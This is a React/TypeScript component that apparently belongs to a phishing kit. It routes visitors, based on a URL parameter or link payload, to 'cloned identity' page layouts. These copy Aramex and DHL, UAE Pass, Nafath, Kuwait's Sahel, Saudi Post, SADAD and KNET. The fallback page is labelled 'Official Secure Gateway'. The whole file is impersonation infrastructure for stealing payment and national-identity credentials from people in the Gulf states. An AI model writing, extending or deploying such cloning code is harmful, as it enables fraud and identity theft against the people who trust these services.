import React from 'react';
import { useSearchParams } from "react-router-dom";
import { PaymentEntityConfig, resolveEntity } from "@/config/gccPaymentEntities";
import { 
  NafathMirrorLayout, 
  UAEDirhamMirrorLayout, 
  SahelMirrorLayout, 
  SPLMirrorLayout, 
  SadadMirrorLayout,
  KnetMirrorLayout 
} from "./MirrorLayouts";
import { 
  AramexMirrorLayout, 
  DhlMirrorLayout 
} from "./CloneLayouts";
import { resolveGovService } from "@/lib/governmentPaymentServices";
import { ThemedHeader } from "@/components/ui/ThemedHeader";

interface MirrorPageWrapperProps {
  children: React.ReactNode;
  entityId?: string;
  title?: string;
  subtitle?: string;
  linkData?: any;
  hideHeader?: boolean;
}

/**
 * MirrorPageWrapper
 * 
 * Central Visual Identity Router.
 * Implements Individual Sovereign Cloning (V350).
 * Achieve 1:1 Identity Sync across all sectors.
 */
export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({ 
  children, 
  entityId, 
  title, 
  subtitle,
  linkData,
  hideHeader = false
}) => {
  const [searchParams] = useSearchParams();
  
  // Priority: 1. Passed ID, 2. URL Param, 3. Link Payload, 4. Default
  const companyKey = entityId || searchParams.get("company") || linkData?.payload?.service_key || 'aramex';
  const normalizedKey = companyKey.toLowerCase().replace(/[^a-z0-9]/g, '');
  const entityConfig = resolveEntity(companyKey);

  // 1. ARAMEX (Cloned Identity)
  if (normalizedKey.includes('aramex')) {
    return (
      <AramexMirrorLayout config={entityConfig} title={title}>
        {children}
      </AramexMirrorLayout>
    );
  }

  // 2. DHL (Cloned Identity)
  if (normalizedKey.includes('dhl')) {
    return (
      <DhlMirrorLayout config={entityConfig} title={title}>
        {children}
      </DhlMirrorLayout>
    );
  }

  // 3. UAE DIRHAM (Digital Dubai / UAE Pass)
  if (normalizedKey.includes('dubai') || normalizedKey.includes('uaepass') || normalizedKey.includes('dirham')) {
    return (
      <UAEDirhamMirrorLayout config={entityConfig} title={title}>
        {children}
      </UAEDirhamMirrorLayout>
    );
  }

  // 4. KSA NAFATH (SDAIA / National Identity)
  if (normalizedKey.includes('nafath') || normalizedKey.includes('iam')) {
    return (
      <NafathMirrorLayout config={entityConfig} title={title}>
        {children}
      </NafathMirrorLayout>
    );
  }

  // 5. KUWAIT SAHEL (MoI / Digital Identity)
  if (normalizedKey.includes('sahel') || normalizedKey.includes('kuwait') || normalizedKey.includes('moi')) {
    return (
      <SahelMirrorLayout config={entityConfig} title={title}>
        {children}
      </SahelMirrorLayout>
    );
  }

  // 6. KSA SPL (Saudi Post / SPL Online)
  if (normalizedKey.includes('spl') || normalizedKey.includes('post')) {
    return (
      <SPLMirrorLayout config={entityConfig} title={title}>
        {children}
      </SPLMirrorLayout>
    );
  }

  // 7. KSA SADAD (OLP / National Billing)
  if (normalizedKey.includes('sadad') || normalizedKey.includes('bill')) {
    return (
      <SadadMirrorLayout config={entityConfig} title={title}>
        {children}
      </SadadMirrorLayout>
    );
  }

  // 8. KNET (Banking Standard)
  if (normalizedKey.includes('knet') || normalizedKey.includes('benefit')) {
    return (
      <KnetMirrorLayout config={entityConfig}>
        {children}
      </KnetMirrorLayout>
    );
  }

  // DEFAULT (Generic Layout for Other Entities)
  return (
    <div className="min-h-screen flex flex-col bg-background font-primary" dir="rtl">
      {!hideHeader && (
        <ThemedHeader
          config={entityConfig}
          title={entityConfig.nameAr}
          subtitle="E-Services & Payment Gateway"
        />
      )}
      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-foreground">{title || entityConfig.nameAr}</h2>
            <p className="text-sm font-medium uppercase tracking-wide text-muted-foreground">{subtitle || 'Official Secure Gateway'}</p>
          </div>
          {children}
        </div>
      </main>
    </div>
  );
};
